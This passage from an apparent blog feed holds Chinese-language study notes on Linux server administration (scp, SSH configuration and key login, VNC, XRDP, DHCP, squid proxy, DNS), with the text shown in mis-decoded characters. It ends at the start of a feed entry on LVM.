æ–‡ä»¶å¼‚åœ°ç›´æ¥å¤åˆ¶: SCP"></a>4. æ–‡ä»¶å¼‚åœ°ç›´æ¥å¤åˆ¶: SCP</h4><p>é€šå¸¸ä½¿ç”¨ sftp æ˜¯å› ä¸ºå¯èƒ½ä¸çŸ¥é“æœåŠ¡å™¨ä¸Šé¢å·²å­˜åœ¨çš„æ–‡ä»¶åä¿¡æ¯, å¦‚æœå·²ç»çŸ¥é“æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶å, å¯ä»¥ä½¿ç”¨ scp ç›´æ¥å¤åˆ¶. å…·ä½“è§ä¹¦.</p><p>ä¸Šä¼ æ ¼å¼:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">scp <span class="hljs-selector-attr">[-pr]</span> <span class="hljs-selector-attr">[-l é€Ÿç‡]</span> file <span class="hljs-selector-attr">[å¸å·@]</span>ä¸»æœº:ç›®å½•å<br></code></pre></td></tr></table></figure><p>ä¸‹è½½æ ¼å¼:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">scp <span class="hljs-selector-attr">[-pr]</span> <span class="hljs-selector-attr">[-l é€Ÿç‡]</span>  <span class="hljs-selector-attr">[å¸å·@]</span>ä¸»æœº:file ç›®å½•å<br></code></pre></td></tr></table></figure><h3 id="11-2-5-SSHD-æœåŠ¡å™¨è¯¦ç»†é…ç½®"><a href="#11-2-5-SSHD-æœåŠ¡å™¨è¯¦ç»†é…ç½®" class="headerlink" title="11.2.5 SSHD æœåŠ¡å™¨è¯¦ç»†é…ç½®"></a>11.2.5 SSHD æœåŠ¡å™¨è¯¦ç»†é…ç½®</h3><p>åŸºæœ¬ä¸Š, æ‰€æœ‰çš„ SSHD æœåŠ¡å™¨çš„è¯¦ç»†è®¾ç½®éƒ½æ”¾åœ¨ <code>/etc/ssh/sshd_config</code> é…ç½®æ–‡ä»¶ä¸­.</p><p>åœ¨é…ç½®æ–‡ä»¶å†…, åªè¦æ˜¯æœªè¢«æ³¨é‡Šçš„è®¾ç½®å€¼, å³ä¸º â€œé»˜è®¤å€¼â€.</p><p>å…·ä½“è§ä¹¦.</p><p><code>LoginGraceTime</code> å°±æ˜¯è®¾ç½®ç»å¤šé•¿æ—¶é—´æ²¡è¿æ¥ä¸Š, å°±æ–­å¼€.</p><h3 id="11-2-6-åˆ¶ä½œä¸ç”¨å¯†ç å¯ç«‹å³ç™»å½•çš„-SSH-ç”¨æˆ·"><a href="#11-2-6-åˆ¶ä½œä¸ç”¨å¯†ç å¯ç«‹å³ç™»å½•çš„-SSH-ç”¨æˆ·" class="headerlink" title="11.2.6 åˆ¶ä½œä¸ç”¨å¯†ç å¯ç«‹å³ç™»å½•çš„ SSH ç”¨æˆ·"></a>11.2.6 åˆ¶ä½œä¸ç”¨å¯†ç å¯ç«‹å³ç™»å½•çš„ SSH ç”¨æˆ·</h3><ul><li>Client å¿…é¡»åˆ¶ä½œå‡º Public &amp; Private è¿™ä¸¤æŠŠ Keys, ä¸” Private Key éœ€è¦æ”¾åˆ° <code>~/.ssh/</code> å†…</li><li>Server å¿…é¡»è¦æœ‰ Public Key, ä¸”æ”¾ç½®åˆ°ç”¨æˆ·ä¸»ç›®å½•ä¸‹çš„ <code>~/.ssh/authorized_keys</code> åŒæ—¶ç›®å½•çš„æƒé™ (<code>.ssh/</code>) å¿…é¡»æ˜¯ 700 è€Œæ–‡ä»¶æƒé™å¿…é¡»ä¸º 644, åŒæ—¶æ–‡ä»¶çš„å±ä¸»ä¸å±ç»„éƒ½å¿…é¡»ä¸è¯¥å¸å·å»åˆæ‰è¡Œ</li></ul><p>ç™»å½•å…¶ä»–ä¸»æœºæ—¶, åªè¦å°†ä½ çš„ Public Key (å³ id_rsa.pub) copy åˆ°å…¶ä»–ä¸»æœºä¸Šé¢, å¹¶ä¸”æ·»åŠ åˆ°æŸå¸å·çš„ <code>~/.ssh/authorized_keys</code> æ–‡ä»¶ä¸­å³å¯.</p><h3 id="11-2-7-ç®€æ˜“å®‰å…¨è®¾ç½®"><a href="#11-2-7-ç®€æ˜“å®‰å…¨è®¾ç½®" class="headerlink" title="11.2.7 ç®€æ˜“å®‰å…¨è®¾ç½®"></a>11.2.7 ç®€æ˜“å®‰å…¨è®¾ç½®</h3><h2 id="11-3-æœ€åŸå§‹å›¾å½¢æ¥å£-XDMCP-æœåŠ¡çš„å¯ç”¨"><a href="#11-3-æœ€åŸå§‹å›¾å½¢æ¥å£-XDMCP-æœåŠ¡çš„å¯ç”¨" class="headerlink" title="11.3 æœ€åŸå§‹å›¾å½¢æ¥å£: XDMCP æœåŠ¡çš„å¯ç”¨"></a>11.3 æœ€åŸå§‹å›¾å½¢æ¥å£: XDMCP æœåŠ¡çš„å¯ç”¨</h2><h3 id="11-3-1-X-Window-çš„-Server-x2F-Client-æ¶æ„ä¸å„ç»„ä»¶"><a href="#11-3-1-X-Window-çš„-Server-x2F-Client-æ¶æ„ä¸å„ç»„ä»¶" class="headerlink" title="11.3.1 X Window çš„ Server&#x2F;Client æ¶æ„ä¸å„ç»„ä»¶"></a>11.3.1 X Window çš„ Server&#x2F;Client æ¶æ„ä¸å„ç»„ä»¶</h3><p>X Client ä¸»æ•°æ®çš„å¤„ç† (å°±çœŸçš„åªæ˜¯å¤„ç†æ•°æ®), X Server ä¸»å›¾å½¢çš„ç»˜åˆ¶ (ç¡¬ä»¶ä¹Ÿæ˜¯ X Server ç®¡ç†).</p><p>æ¯”å¦‚è¦åœ¨ Client æœºå­ä¸Šé¢è¦æ‰“å¼€ä¸€ä¸ªè½¯ä»¶, X Client ä¼šå°†ç›¸å…³ä¿¡æ¯ä¼ é€’ç»™ X Server æ¥ç»˜åˆ¶.</p><p>X Client å’Œ X Server å¯ä»¥ä½äºä¸åŒçš„æœºå™¨ä¸­.</p><h3 id="11-3-2-è®¾å®š-GDM-çš„-XDMCP-æœåŠ¡"><a href="#11-3-2-è®¾å®š-GDM-çš„-XDMCP-æœåŠ¡" class="headerlink" title="11.3.2 è®¾å®š GDM çš„ XDMCP æœåŠ¡"></a>11.3.2 è®¾å®š GDM çš„ XDMCP æœåŠ¡</h3><h2 id="11-4-åä¸½çš„å›¾å½¢æ¥å£-VNC-æœåŠ¡å™¨"><a href="#11-4-åä¸½çš„å›¾å½¢æ¥å£-VNC-æœåŠ¡å™¨" class="headerlink" title="11.4 åä¸½çš„å›¾å½¢æ¥å£: VNC æœåŠ¡å™¨"></a>11.4 åä¸½çš„å›¾å½¢æ¥å£: VNC æœåŠ¡å™¨</h2><p>VNC å³ Virtual Network Computing.</p><h3 id="11-4-1-é»˜è®¤çš„-VNC-æœåŠ¡å™¨"><a href="#11-4-1-é»˜è®¤çš„-VNC-æœåŠ¡å™¨" class="headerlink" title="11.4.1 é»˜è®¤çš„ VNC æœåŠ¡å™¨"></a>11.4.1 é»˜è®¤çš„ VNC æœåŠ¡å™¨</h3><p>VNC Server ä¼šåœ¨æœåŠ¡å™¨ç«¯å¯åŠ¨ä¸€ä¸ªç›‘å¬ç”¨æˆ·è¦æ±‚çš„ç«¯å£, ä¸€èˆ¬ç«¯å£å·ç åœ¨ 5901 ~ 5910 ä¹‹é—´. å½“å®¢æˆ·ç«¯å¯åŠ¨ X Server è¿æ¥åˆ° 5901 ä¹‹å, VNC Server å†å°†ä¸€å †é¢„å…ˆè®¾ç½®å¥½çš„ X Client é€šè¿‡è¿™ä¸ªè¿æ¥ä¼ é€’åˆ°å®¢æˆ·ç«¯ä¸Š.</p><p>ä¸€èˆ¬æ¥è¯´, VNC Server éƒ½æ˜¯æ‰‹åŠ¨å¯åŠ¨çš„, ä½¿ç”¨å®Œæ¯•å, å†å°† VNC Server å…³é—­å³å¯.</p><p>ä½¿ç”¨:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ vncserver [:å·ç ] [-geometry åˆ†è¾¨ç‡] [options]<br></code></pre></td></tr></table></figure><p><code>:å·ç </code> å°±æ˜¯å°† VNC Server å¼€åœ¨å“ªä¸ªç«¯å£, å¦‚æœæ˜¯ <code>:1</code> åˆ™ä»£è¡¨ VNC 5901 ç«¯å£.</p><p><code>-kill</code>, å°†å·²ç»å¯åŠ¨çš„ VNC ç«¯å£åˆ é™¤.</p><p>ä¸‹è½½æœåŠ¡å™¨è½¯ä»¶:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo pacman -S tigervnc-server<br></code></pre></td></tr></table></figure><p>å»ºç«‹çš„å¯†ç å­˜æ”¾åœ¨ <code>.vnc/passwd</code> æ–‡ä»¶ä¸­.</p><p>ä½¿ç”¨ <code>vncpasswd</code> ä¿®æ”¹å¯†ç .</p><p>ä¿®æ”¹é˜²ç«å¢™è§„åˆ™æ”¾å¼€ç«¯å£.</p><h3 id="11-4-2-VNC-çš„å®¢æˆ·ç«¯è¿æ¥è½¯ä»¶"><a href="#11-4-2-VNC-çš„å®¢æˆ·ç«¯è¿æ¥è½¯ä»¶" class="headerlink" title="11.4.2 VNC çš„å®¢æˆ·ç«¯è¿æ¥è½¯ä»¶"></a>11.4.2 VNC çš„å®¢æˆ·ç«¯è¿æ¥è½¯ä»¶</h3><h4 id="1-Linux-çš„å®¢æˆ·ç«¯ç¨‹åº-VNC-Viewer"><a href="#1-Linux-çš„å®¢æˆ·ç«¯ç¨‹åº-VNC-Viewer" class="headerlink" title="1. Linux çš„å®¢æˆ·ç«¯ç¨‹åº: VNC Viewer"></a>1. Linux çš„å®¢æˆ·ç«¯ç¨‹åº: VNC Viewer</h4><p>å®‰è£…:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo pacman -S tigervnc<br></code></pre></td></tr></table></figure><p>è¿æ¥, éœ€è¦æŒ‡æ˜æœåŠ¡ç«¯çš„å›¾å½¢æ¥å£:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ vncviewer 192.168.10.254:3<br></code></pre></td></tr></table></figure><p>ä¸€èˆ¬å»ºè®®ä½¿ç”¨ä¸€èˆ¬èº«ä»½æ¥å¯åŠ¨ VNC Server.</p><h3 id="11-4-3-VNC-æ­é…æœ¬æœºçš„-XDMCP-ç”»é¢"><a href="#11-4-3-VNC-æ­é…æœ¬æœºçš„-XDMCP-ç”»é¢" class="headerlink" title="11.4.3 VNC æ­é…æœ¬æœºçš„ XDMCP ç”»é¢"></a>11.4.3 VNC æ­é…æœ¬æœºçš„ XDMCP ç”»é¢</h3><h3 id="11-4-4-å¼€æœºå°±å¯åŠ¨-VNC-Server-çš„æ–¹æ³•"><a href="#11-4-4-å¼€æœºå°±å¯åŠ¨-VNC-Server-çš„æ–¹æ³•" class="headerlink" title="11.4.4 å¼€æœºå°±å¯åŠ¨ VNC Server çš„æ–¹æ³•"></a>11.4.4 å¼€æœºå°±å¯åŠ¨ VNC Server çš„æ–¹æ³•</h3><h3 id="11-4-5-åŒæ­¥çš„-VNC-å¯ä»¥é€šè¿‡å›¾ç¤ºåŒæ­¥æ•™å­¦"><a href="#11-4-5-åŒæ­¥çš„-VNC-å¯ä»¥é€šè¿‡å›¾ç¤ºåŒæ­¥æ•™å­¦" class="headerlink" title="11.4.5 åŒæ­¥çš„ VNC: å¯ä»¥é€šè¿‡å›¾ç¤ºåŒæ­¥æ•™å­¦"></a>11.4.5 åŒæ­¥çš„ VNC: å¯ä»¥é€šè¿‡å›¾ç¤ºåŒæ­¥æ•™å­¦</h3><p>å‚è€ƒ <a href="http://phorum.study-area.org/viewtopic.php?t=25713">ç½‘å€</a></p><h2 id="11-5-ä»¿çœŸçš„è¿œç¨‹æ¡Œé¢ç³»ç»Ÿ-XRDP-æœåŠ¡å™¨"><a href="#11-5-ä»¿çœŸçš„è¿œç¨‹æ¡Œé¢ç³»ç»Ÿ-XRDP-æœåŠ¡å™¨" class="headerlink" title="11.5 ä»¿çœŸçš„è¿œç¨‹æ¡Œé¢ç³»ç»Ÿ: XRDP æœåŠ¡å™¨"></a>11.5 ä»¿çœŸçš„è¿œç¨‹æ¡Œé¢ç³»ç»Ÿ: XRDP æœåŠ¡å™¨</h2><p>XRDP å°±æ˜¯ Linux Remote Desktop Protocol. å…¶è¿æ¥å…·æœ‰åŠ å¯†åŠŸèƒ½.</p><p>å®‰è£…åœ¨éœ€è¦è¢«è¿æ¥çš„ä¸»æœºä¸Š.</p><p>XRDP ä¼šè‡ªåŠ¨å¯åŠ¨ VNC æ¥è·å–ç”»é¢, å› æ­¤è¦é…åˆ VNC ä½¿ç”¨.</p><h2 id="11-6-SSH-æœåŠ¡å™¨çš„é«˜çº§åº”ç”¨"><a href="#11-6-SSH-æœåŠ¡å™¨çš„é«˜çº§åº”ç”¨" class="headerlink" title="11.6 SSH æœåŠ¡å™¨çš„é«˜çº§åº”ç”¨"></a>11.6 SSH æœåŠ¡å™¨çš„é«˜çº§åº”ç”¨</h2><h3 id="11-6-1-åœ¨éæ ‡å‡†ç«¯å£å¯åŠ¨-SSH-é-Port-22"><a href="#11-6-1-åœ¨éæ ‡å‡†ç«¯å£å¯åŠ¨-SSH-é-Port-22" class="headerlink" title="11.6.1 åœ¨éæ ‡å‡†ç«¯å£å¯åŠ¨ SSH (é Port 22)"></a>11.6.1 åœ¨éæ ‡å‡†ç«¯å£å¯åŠ¨ SSH (é Port 22)</h3><h1 id="ç¬¬12ç« -ç½‘ç»œå‚æ•°æ§ç®¡è€…-DHCP-æœåŠ¡å™¨"><a href="#ç¬¬12ç« -ç½‘ç»œå‚æ•°æ§ç®¡è€…-DHCP-æœåŠ¡å™¨" class="headerlink" title="ç¬¬12ç«  ç½‘ç»œå‚æ•°æ§ç®¡è€…: DHCP æœåŠ¡å™¨"></a>ç¬¬12ç«  ç½‘ç»œå‚æ•°æ§ç®¡è€…: DHCP æœåŠ¡å™¨</h1><p>ä¸€å®šéœ€è¦çš„ç½‘ç»œå‚æ•°:<br>IP, netmask, network, broadcast, Gateway, DNS IP</p><h3 id="12-1-2-DHCP-åè®®çš„è¿ä½œæ–¹å¼"><a href="#12-1-2-DHCP-åè®®çš„è¿ä½œæ–¹å¼" class="headerlink" title="12.1.2 DHCP åè®®çš„è¿ä½œæ–¹å¼"></a>12.1.2 DHCP åè®®çš„è¿ä½œæ–¹å¼</h3><p>DHCP é€šå¸¸ç”¨äºå±€åŸŸç½‘ä¸­, ç”±å®¢æˆ·ç«¯å¹¿æ’­æ•°æ®åŒ…ç»™ç‰©ç†ç½‘æ®µå†…çš„æ‰€æœ‰ä¸»æœº, è‹¥å±€åŸŸç½‘ä¸­æœ‰ DHCP æœåŠ¡å™¨æ—¶, æ‰ä¼šå“åº”å®¢æˆ·ç«¯çš„ IP å‚æ•°è¦æ±‚.</p><p>DHCP Server åœ¨æ¥æ”¶åˆ°è¯·æ±‚å, ä¼šé’ˆå¯¹ç”¨æˆ·çš„ MAC å’Œæœ¬èº«è®¾å®šçš„æ•°æ®æ¥é…ç½®:</p><ul><li>åˆ°æœåŠ¡å™¨çš„ç™»å½•æ–‡ä»¶ä¸­å¯»æ‰¾è¯¥ç”¨æˆ·ä¹‹å‰æ˜¯å¦æ›¾ç»ç”¨è¿‡æŸä¸ª IP, è‹¥æœ‰ä¸”è¯¥ IP ç›®å‰æ— äººä½¿ç”¨, åˆ™æä¾›æ­¤ IP ç»™å®¢æˆ·ç«¯</li><li>è‹¥é…ç½®æ–‡ä»¶é’ˆå¯¹è¯¥ MAC æä¾›é¢å¤–çš„å›ºå®š IP (static IP), åˆ™æä¾›è¯¥å›ºå®š IP</li><li>è‹¥éƒ½ä¸ç¬¦åˆ, éšæœºåˆ†é…å¹¶è®°å½•.</li></ul><p>åœ¨æ¥å—ä¸€ä¸ª DHCP Server æä¾›çš„å‚æ•°å, Client ä¹Ÿä¼šå‘é€ä¸€ä¸ªå¹¿æ’­åŒ…ç»™è¯¥ç‰©ç†æ®µå†…çš„æ‰€æœ‰ä¸»æœº, å‘ŠçŸ¥å·²ç»æ¥å—äº†è¯¥æœåŠ¡å™¨çš„ç§Ÿçº¦.</p><p>DHCP çš„ç§Ÿçº¦ä¼šåˆ°æœŸ, å¯ä»¥é‡æ–°ç”³è¯·.</p><p>å¯ä»¥è®¾å®š DHCP æœåŠ¡å™¨ç»™äºˆå®¢æˆ·ç«¯çš„ IP å‚æ•°:</p><ul><li>å›ºå®š IP, è®©è®¡ç®—æœºæ¯æ¬¡éƒ½èƒ½ä»¥ä¸€ä¸ªå›ºå®šçš„ IP è¿ä¸Š Internet</li><li>åŠ¨æ€ IP</li></ul><p>è§‚å¯Ÿåˆ«äººçš„ MAC, ç”¨ <code>ping</code> é…åˆ <code>arp</code>:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ ping -c 3 192.168.1.254<br>$ arp -n<br></code></pre></td></tr></table></figure><p>è®¾å®šæœŸé™çš„ä¼˜ç‚¹æ˜¯é¿å… IP è¢«æŸäº›ä½¿ç”¨è€…ä¸€ç›´å ç”¨.</p><p>ä¸€èˆ¬æ¥è¯´, å‡è®¾ç§Ÿçº¦æœŸé™æ˜¯ T å°æ—¶, é‚£ä¹ˆå®¢æˆ·ç«¯åœ¨ 0.5T ä¼šä¸»åŠ¨å‘ DHCP æœåŠ¡å™¨å‘å‡ºé‡æ–°è¦æ±‚ç½‘ç»œå‚æ•°çš„æ•°æ®åŒ…, å¦‚æœè¿™æ¬¡è¦æ±‚æ²¡æœ‰æˆåŠŸ, é‚£ä¹ˆåœ¨ 0.875T åè¿˜ä¼šå†æ¬¡å‘é€æ•°æ®åŒ…ä¸€æ¬¡.</p><p>å¤šéƒ¨ DHCP æœåŠ¡å™¨åœ¨åŒä¸€ä¸ªç‰©ç†ç½‘æ®µæ—¶, å…ˆæŠ¢å…ˆèµ¢.</p><h3 id="12-1-3-ä½•æ—¶éœ€è¦æ¶è®¾-DHCP-æœåŠ¡å™¨"><a href="#12-1-3-ä½•æ—¶éœ€è¦æ¶è®¾-DHCP-æœåŠ¡å™¨" class="headerlink" title="12.1.3 ä½•æ—¶éœ€è¦æ¶è®¾ DHCP æœåŠ¡å™¨"></a>12.1.3 ä½•æ—¶éœ€è¦æ¶è®¾ DHCP æœåŠ¡å™¨</h3><p>å½“å…¬å¸å†…éƒ¨æœ‰ç›¸å½“å¤šçš„ç¬”è®°æœ¬ç”µè„‘æ—¶.</p><p>åŒºåŸŸå†…è®¡ç®—æœºæ•°é‡ç›¸å½“å¤šæ—¶.</p><h1 id="ç¬¬17ç« -å±€åŸŸç½‘æ§åˆ¶è€…-Proxy-æœåŠ¡å™¨"><a href="#ç¬¬17ç« -å±€åŸŸç½‘æ§åˆ¶è€…-Proxy-æœåŠ¡å™¨" class="headerlink" title="ç¬¬17ç«  å±€åŸŸç½‘æ§åˆ¶è€…: Proxy æœåŠ¡å™¨"></a>ç¬¬17ç«  å±€åŸŸç½‘æ§åˆ¶è€…: Proxy æœåŠ¡å™¨</h1><p>ä»£ç†æœåŠ¡å™¨çš„åŠŸèƒ½æ˜¯å¯ä»¥ä»£ç†å±€åŸŸç½‘ç»œçš„ä¸ªäººè®¡ç®—æœºæ¥å‘å› ç‰¹ç½‘å–å¾—ç½‘é¡µæˆ–å…¶ä»–æœåŠ¡å™¨çš„ä¸€ç§æœåŠ¡.</p><p>ä»£ç†æœåŠ¡å™¨ä½¿ç”¨åœ¨åº”ç”¨å±‚ä¸Šçš„ä¸€ç§é˜²ç«å¢™æ–¹å¼, è€Œ iptables æ˜¯ç”¨åœ¨ç½‘ç»œ, ä¼ è¾“å±‚.</p><p>Linux ä¸Šå¯åŠ¨ä»£ç†æœåŠ¡å™¨çš„æ˜¯ squid è¿™ä¸ªè½¯ä»¶.</p><h2 id="17-1-ä»€ä¹ˆæ˜¯ä»£ç†æœåŠ¡å™¨-Proxy"><a href="#17-1-ä»€ä¹ˆæ˜¯ä»£ç†æœåŠ¡å™¨-Proxy" class="headerlink" title="17.1 ä»€ä¹ˆæ˜¯ä»£ç†æœåŠ¡å™¨ (Proxy)"></a>17.1 ä»€ä¹ˆæ˜¯ä»£ç†æœåŠ¡å™¨ (Proxy)</h2><p>æˆ‘ä»¬å¯ä»¥é€è¿‡ä»£ç†æœåŠ¡å™¨æ¥è¾¾æˆé˜²ç«å¢™åŠŸèƒ½ä¸ç”¨æˆ·æµè§ˆæ•°æ®çš„åˆ†æ.</p><p>ä¹Ÿå¯ä»¥ç”¨ä»£ç†æœåŠ¡å™¨æ¥è¾¾æˆèŠ‚çœå®½å¸¦çš„ç›®çš„.</p><h3 id="17-1-1-ä»€ä¹ˆæ˜¯ä»£ç†æœåŠ¡å™¨-Proxy"><a href="#17-1-1-ä»€ä¹ˆæ˜¯ä»£ç†æœåŠ¡å™¨-Proxy" class="headerlink" title="17.1.1 ä»€ä¹ˆæ˜¯ä»£ç†æœåŠ¡å™¨ (Proxy)"></a>17.1.1 ä»€ä¹ˆæ˜¯ä»£ç†æœåŠ¡å™¨ (Proxy)</h3><p>å½“å®¢æˆ·ç«¯æœ‰å› ç‰¹ç½‘çš„æ•°æ®è¦æ±‚æ—¶, Proxy ä¼šå¸®ç”¨æˆ·å»å‘ç›®çš„åœ°å–å¾—ç”¨æˆ·æ‰€éœ€è¦çš„æ•°æ®.</p><p>å®¢æˆ·ç«¯å‘å¤–éƒ¨è¦æ±‚çš„èµ„æ–™äº‹å®ä¸Šéƒ½æ˜¯ Proxy å¸®ç”¨æˆ·å–å¾—çš„, å› æ­¤å› ç‰¹ç½‘ä¸Šé¢çœ‹åˆ°è¦æ±‚æ•°æ®è€…, å°†ä¼šæ˜¯ Proxy æœåŠ¡å™¨çš„ IP è€Œä¸æ˜¯å®¢æˆ·ç«¯çš„ IP.</p><h3 id="17-1-2-ä»£ç†æœåŠ¡å™¨çš„è¿ä½œæµç¨‹"><a href="#17-1-2-ä»£ç†æœåŠ¡å™¨çš„è¿ä½œæµç¨‹" class="headerlink" title="17.1.2 ä»£ç†æœåŠ¡å™¨çš„è¿ä½œæµç¨‹"></a>17.1.2 ä»£ç†æœåŠ¡å™¨çš„è¿ä½œæµç¨‹</h3><h3 id="17-1-3-ä¸Šå±‚ä»£ç†æœåŠ¡å™¨"><a href="#17-1-3-ä¸Šå±‚ä»£ç†æœåŠ¡å™¨" class="headerlink" title="17.1.3 ä¸Šå±‚ä»£ç†æœåŠ¡å™¨"></a>17.1.3 ä¸Šå±‚ä»£ç†æœåŠ¡å™¨</h3><p>å³æŒ‡å®šå¦ä¸€å° Proxy ä½œä¸ºæˆ‘çš„ Proxy çš„ Proxy.</p><p>ç”±äºä»£ç†æœåŠ¡å™¨éœ€è¦ç®¡æ§ä¿¡ä»»çš„æ¥æºå®¢æˆ·ç«¯è®¡ç®—æœº, å› æ­¤å„ ISP ä»…èƒ½é’ˆå¯¹è‡ªå®¶çš„ç”¨æˆ·æ¥å¼€æ”¾ Proxy ä½¿ç”¨æƒ.</p><h3 id="17-1-4-ä»£ç†æœåŠ¡å™¨ä¸-NAT-æœåŠ¡å™¨çš„å·®å¼‚"><a href="#17-1-4-ä»£ç†æœåŠ¡å™¨ä¸-NAT-æœåŠ¡å™¨çš„å·®å¼‚" class="headerlink" title="17.1.4 ä»£ç†æœåŠ¡å™¨ä¸ NAT æœåŠ¡å™¨çš„å·®å¼‚"></a>17.1.4 ä»£ç†æœåŠ¡å™¨ä¸ NAT æœåŠ¡å™¨çš„å·®å¼‚</h3><h3 id="17-1-5-æ¶è®¾ä»£ç†æœåŠ¡å™¨çš„ç”¨é€”ä¸ä¼˜ç¼ºç‚¹"><a href="#17-1-5-æ¶è®¾ä»£ç†æœåŠ¡å™¨çš„ç”¨é€”ä¸ä¼˜ç¼ºç‚¹" class="headerlink" title="17.1.5 æ¶è®¾ä»£ç†æœåŠ¡å™¨çš„ç”¨é€”ä¸ä¼˜ç¼ºç‚¹"></a>17.1.5 æ¶è®¾ä»£ç†æœåŠ¡å™¨çš„ç”¨é€”ä¸ä¼˜ç¼ºç‚¹</h3><p>NAT æœåŠ¡å™¨æ˜¯ç”±è¾ƒåº•å±‚çš„ç½‘ç»œè¿›è¡Œåˆ†æçš„å·¥ä½œ.</p><p>proxy åˆ™ä¸»è¦æ˜¯ç”±ä¸€ä¸ª daemon çš„åŠŸèƒ½è¾¾æˆçš„, æ‰€ä»¥å¿…é¡»è¦ç¬¦åˆè¯¥ daemon çš„éœ€æ±‚, æ‰èƒ½è¾¾åˆ°æŸäº›åŠŸèƒ½.</p><p>è‹¥è¦è¿ä¸Šå›½å¤–çš„ç½‘é¡µ, æœ€å¥½ä½¿ç”¨ ISP æä¾›ç»™ä½ çš„ä»£ç†æœåŠ¡å™¨.</p><h2 id="17-2-Proxy-æœåŠ¡å™¨çš„åŸºç¡€è®¾å®š"><a href="#17-2-Proxy-æœåŠ¡å™¨çš„åŸºç¡€è®¾å®š" class="headerlink" title="17.2 Proxy æœåŠ¡å™¨çš„åŸºç¡€è®¾å®š"></a>17.2 Proxy æœåŠ¡å™¨çš„åŸºç¡€è®¾å®š</h2><p>åœ¨å°å‹çš„ç½‘ç»œç¯å¢ƒä¸­, æ¶è®¾ Proxy çš„ç”¨å¤„ä¸å¤§.</p><h3 id="17-2-1-Proxy-æ‰€éœ€çš„-squid-è½¯ä»¶åŠå…¶è½¯ä»¶ç»“æ„"><a href="#17-2-1-Proxy-æ‰€éœ€çš„-squid-è½¯ä»¶åŠå…¶è½¯ä»¶ç»“æ„" class="headerlink" title="17.2.1 Proxy æ‰€éœ€çš„ squid è½¯ä»¶åŠå…¶è½¯ä»¶ç»“æ„"></a>17.2.1 Proxy æ‰€éœ€çš„ squid è½¯ä»¶åŠå…¶è½¯ä»¶ç»“æ„</h3><p>squid ä¸»è¦æä¾›çš„é…ç½®æ–‡ä»¶æœ‰:</p><ul><li><code>/etc/squid/squid.conf</code>, å…¶åŒ…å«æ‰€æœ‰çš„è®¾å®š</li><li><code>/etc/squid/mime.conf</code>, è®¾å®š mine æ ¼å¼</li></ul><p>å…¶ä»–é‡è¦çš„ç›®å½•ä¸æ–‡ä»¶:</p><ul><li><code>/usr/sbin/squid</code>, æä¾› squid ä¸»ç¨‹åº</li><li><code>/var/spool/squid</code>, é»˜è®¤çš„ squid ç¼“å­˜å­˜å‚¨çš„ç›®å½•</li><li><code>/usr/lib64/squid/</code>, æä¾› squid é¢å¤–çš„æ§åˆ¶æ¨¡å—, å°¤å…¶æ˜¯å½±å“è®¤è¯å¯†ç æ–¹é¢çš„ç¨‹åº.</li></ul><h3 id="17-2-2-CentOS-é»˜è®¤çš„-squid-è®¾ç½®"><a href="#17-2-2-CentOS-é»˜è®¤çš„-squid-è®¾ç½®" class="headerlink" title="17.2.2 CentOS é»˜è®¤çš„ squid è®¾ç½®"></a>17.2.2 CentOS é»˜è®¤çš„ squid è®¾ç½®</h3><p>é…ç½®æ–‡ä»¶å„è®¾ç½®å€¼çš„å«ä¹‰, å…·ä½“è§ä¹¦.</p><h1 id="ç¬¬19ç« -ä¸»æœºåæ§åˆ¶è€…-DNS-æœåŠ¡å™¨"><a href="#ç¬¬19ç« -ä¸»æœºåæ§åˆ¶è€…-DNS-æœåŠ¡å™¨" class="headerlink" title="ç¬¬19ç«  ä¸»æœºåæ§åˆ¶è€…: DNS æœåŠ¡å™¨"></a>ç¬¬19ç«  ä¸»æœºåæ§åˆ¶è€…: DNS æœåŠ¡å™¨</h1><h2 id="19-1-ä»€ä¹ˆæ˜¯-DNS"><a href="#19-1-ä»€ä¹ˆæ˜¯-DNS" class="headerlink" title="19.1 ä»€ä¹ˆæ˜¯ DNS"></a>19.1 ä»€ä¹ˆæ˜¯ DNS</h2><h3 id="19-1-1-ç”¨ç½‘ç»œä¸»æœºåå–å¾—-IP-çš„å†å²æ¸Šæº"><a href="#19-1-1-ç”¨ç½‘ç»œä¸»æœºåå–å¾—-IP-çš„å†å²æ¸Šæº" class="headerlink" title="19.1.1 ç”¨ç½‘ç»œä¸»æœºåå–å¾— IP çš„å†å²æ¸Šæº"></a>19.1.1 ç”¨ç½‘ç»œä¸»æœºåå–å¾— IP çš„å†å²æ¸Šæº</h3><p><code>/etc/hosts</code> æ–‡ä»¶çš„ç”¨æ³•: â€œIP ä¸»æœºå ä¸»æœºåˆ«å1 ä¸»æœºåˆ«å2 â€¦â€. localhost éœ€è¦å¯¹åº” <code>127.0.0.1</code></p><h4 id="å®Œæ•´ä¸»æœºå-Fully-Qualified-Domain-Name-FQDN"><a href="#å®Œæ•´ä¸»æœºå-Fully-Qualified-Domain-Name-FQDN" class="headerlink" title="å®Œæ•´ä¸»æœºå: Fully Qualified Domain Name (FQDN)"></a>å®Œæ•´ä¸»æœºå: Fully Qualified Domain Name (FQDN)</h4><p>Domainname åŠ ä¸Š hostname æ‰æ˜¯ FQDN.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>LVM è§£æ</title>
    <link href="/2022/09/08/LVM-%E8%A7%A3%E6%9E%90/"/>
    <url>/2022/09/08/LVM-%E8%A7%A3%E6%9E%90/</url>
    
